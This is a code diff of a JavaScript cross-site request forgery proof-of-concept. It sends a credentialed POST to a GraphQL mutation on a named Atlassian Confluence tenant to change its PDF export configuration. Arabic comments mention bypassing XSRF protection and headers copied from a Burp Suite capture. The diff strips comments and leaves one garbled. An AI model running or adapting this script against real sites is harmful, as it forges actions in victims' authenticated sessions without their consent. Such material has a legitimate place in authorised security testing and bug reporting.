@@ -1,16 +1,14 @@
 function updatePdfConfig() {
   var xhttp = new XMLHttpRequest();
-  // الرابط بناءً على طلبك الأخير
+  // الرابطر
   var url = "https://anshall.atlassian.net/cgraphql?q=PdfExportPageUpdatePdfExportConfigurationMutation";
 
   xhttp.open("POST", url, true);
 
-  // إعداد الرؤوس (Headers) الهامة جداً لنجاح هذا الطلب تحديداً
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.setRequestHeader("Accept", "*/*");
   
-  // الرؤوس المخصصة التي ظهرت في طلب الـ Burp Suite الخاص بك
-  xhttp.setRequestHeader("X-Apollo-Operation-Name", "PdfExportPageUpdatePdfExportConfigurationMutation");
+  xhttp.setRequestHeader("X-Apollo-Operation-Name", "");
   xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
   
   // تجاوز حماية الـ XSRF
@@ -18,7 +16,6 @@ function updatePdfConfig() {
 
   xhttp.withCredentials = true;
 
-  // بناء محتوى الطلب (Payload)
   var data = JSON.stringify([{
     "operationName": "PdfExportPageUpdatePdfExportConfigurationMutation",
     "variables": {
@@ -37,7 +34,6 @@ function updatePdfConfig() {
       console.log("Status: " + this.status);
       console.log("Response: " + this.responseText);
       
-      // تحليل الرد للتأكد من النجاح
       if (this.responseText.includes('"success":true')) {
           console.log("✅ Mutation Successful!");
       } else {
@@ -51,3 +47,4 @@ function updatePdfConfig() {
 
 // تنفيذ العملية
 updatePdfConfig();
+
